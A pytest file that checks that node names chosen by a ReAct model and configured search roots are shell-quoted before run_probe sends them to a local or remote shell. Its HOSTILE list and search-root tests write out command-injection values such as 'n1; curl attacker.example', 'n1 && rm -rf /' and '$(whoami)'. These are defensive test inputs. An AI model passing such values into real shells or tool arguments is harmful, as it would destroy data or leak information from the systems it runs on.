"""Values that reach a shell arrive as one argument.

``run_probe`` composes pipelines and runs them through a shell -- locally with
``shell=True``, remotely by handing one string to ssh for the remote shell to
parse. Two kinds of value are interpolated into those pipelines: node names,
which are ReAct tool arguments and therefore chosen by the model, and the search
roots, which come from CIA_SEARCH_ROOTS.

Neither was quoted. A node name of ``n1; curl attacker.example`` ran the curl,
and a search root with a space in it arrived as two directories.

These assert by splitting the composed command the way a shell would, so they
fail on the property that matters rather than on the presence of a quote
character.
"""

from __future__ import annotations

import shlex

import pytest

from aorta.cia.launch import discovery, planner
from aorta.cia.launch.cluster import quoted_search_roots

#: Shapes that end one command and start another, or smuggle a second word.
HOSTILE = [
    "n1; curl attacker.example",
    "n1 && rm -rf /",
    "n1 | tee /tmp/stolen",
    "n1$(whoami)",
    "n1`whoami`",
    "n1 --other-flag",
    "a node with spaces",
    "n1\nsecond-line",
]


@pytest.fixture
def probed(monkeypatch):
    """Capture the command string each probe composes."""
    sent: list[str] = []
    monkeypatch.setattr(discovery, "run_probe", lambda host, cmd, **k: sent.append(cmd) or "")
    monkeypatch.setattr(planner, "run_probe", lambda host, cmd, **k: sent.append(cmd) or "")
    return sent


class TestTheModelSuppliedNode:
    @pytest.mark.parametrize("node", HOSTILE)
    def test_it_survives_as_a_single_argument(self, node, probed):
        """check_gpu_arch takes node straight from the model's tool call."""
        discovery.check_gpu_arch("localhost", node)

        words = shlex.split(probed[0])
        assert node in words, f"{node!r} did not arrive as one argument: {words}"

    @pytest.mark.parametrize("node", HOSTILE)
    def test_it_introduces_no_second_command(self, node, probed):
        discovery.check_gpu_arch("localhost", node)
        composed = probed[0]

        # Everything the pipeline is allowed to contain, by construction.
        expected = {"|", "head", "-3", "sinfo", "-N", "-n", "--noheader", "-o", "%G %f"}
        words = [w for w in shlex.split(composed) if w not in expected]
        assert words == [node, "2>/dev/null"] or words == ["2>/dev/null", node], (
            f"unexpected words reached the shell: {words}"
        )

    def test_an_ordinary_node_still_reaches_sinfo(self, probed):
        discovery.check_gpu_arch("localhost", "node-01")
        assert "node-01" in shlex.split(probed[0])


class TestTheSearchRoots:
    def test_a_root_with_a_space_stays_one_directory(self, monkeypatch):
        monkeypatch.setenv("CIA_SEARCH_ROOTS", "/a path with spaces")
        assert shlex.split(quoted_search_roots()) == ["/a path with spaces"]

    def test_a_root_cannot_start_a_second_command(self, monkeypatch):
        monkeypatch.setenv("CIA_SEARCH_ROOTS", "/data;rm -rf /")
        assert shlex.split(quoted_search_roots()) == ["/data;rm -rf /"]

    def test_several_roots_stay_several(self, monkeypatch):
        monkeypatch.setenv("CIA_SEARCH_ROOTS", "/one:/two:/three")
        assert shlex.split(quoted_search_roots()) == ["/one", "/two", "/three"]

    def test_no_roots_falls_back_to_home(self, monkeypatch):
        monkeypatch.setenv("CIA_SEARCH_ROOTS", "")
        monkeypatch.setattr("aorta.cia.launch.cluster.search_roots", lambda: [])
        assert quoted_search_roots() == "~"

    @pytest.mark.parametrize(
        "probe_call",
        [
            lambda: discovery.read_cluster_configs("localhost"),
            lambda: planner.read_existing_launch_scripts("localhost", "node-01"),
        ],
    )
    def test_the_probes_that_search_them_quote_them(self, probe_call, probed, monkeypatch):
        monkeypatch.setenv("CIA_SEARCH_ROOTS", "/a path;rm -rf /")
        probe_call()

        assert "/a path;rm -rf /" in shlex.split(probed[0])
